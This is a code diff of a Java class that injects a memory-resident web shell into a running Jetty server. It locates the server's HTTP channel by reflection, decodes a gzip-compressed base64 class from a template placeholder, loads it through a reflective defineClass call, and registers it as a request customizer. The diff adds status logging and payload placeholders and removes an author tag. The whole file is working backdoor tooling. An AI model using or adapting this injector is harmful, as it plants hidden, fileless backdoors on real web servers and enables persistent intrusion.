@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.jetty;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Array;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
@@ -12,15 +13,19 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  */
 public class JettyCustomizerInjector {
 
-    
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
 
-    private static String shellClassName;
-    private static String shellClass;
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() throws IOException {
+        return "{{base64Str}}";
+    }
 
     public JettyCustomizerInjector() {
         if (ok) {
@@ -30,34 +35,39 @@ public class JettyCustomizerInjector {
         try {
             channel = getChannel();
         } catch (Throwable throwable) {
-            
+            msg += "channel error: " + getErrorMessage(throwable);
         }
-        if (channel != null) {
+        if (channel == null) {
+            msg += "channel not found";
+        } else {
             try {
-             
+                msg += ("channel: [" + channel + "] ");
                 Object shell = getShell(channel);
                 inject(channel, shell);
-               
+                msg += "[/*] ready\n";
             } catch (Throwable e) {
-               
+                msg += "failed " + getErrorMessage(e) + "\n";
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
+        System.out.println(msg);
     }
 
     public void inject(Object channel, Object shell) throws Exception {
         Object httpConfiguration = invokeMethod(channel, "getHttpConfiguration");
         List<Object> customizers = (List<Object>) invokeMethod(httpConfiguration, "getCustomizers");
         for (Object customizer : customizers) {
-            if (customizer.getClass().getName().equals(shellClassName)) {
+            if (customizer.getClass().getName().equals(getClassName())) {
                 return;
             }
         }
         customizers.add(shell);
     }
 
+    @Override
+    public String toString() {
+        return msg;
+    }
 
     /**
      * org.eclipse.jetty.server.HttpChannel
@@ -87,15 +97,16 @@ public class JettyCustomizerInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = context.getClass().getClassLoader();
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
@@ -188,6 +199,21 @@ public class JettyCustomizerInjector {
             throw e;
         } catch (Exception e) {
             throw new RuntimeException("Error invoking method: " + methodName, e);
+        }
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
         }
     }
 }
